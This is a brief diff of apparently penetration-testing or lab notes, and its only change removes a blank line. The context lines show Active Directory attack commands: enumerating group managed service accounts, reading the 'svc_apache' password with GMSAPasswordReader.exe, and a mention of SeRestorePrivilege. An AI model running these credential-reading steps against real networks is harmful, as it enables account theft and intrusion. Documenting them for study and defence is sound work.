@@ -31,7 +31,6 @@ Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq “msDS-GroupM
 .\GMSAPasswordReader.exe --AccountName ‘svc_apache’
 ```
 
-
 ```
 SeRestorePrivilege
 ```
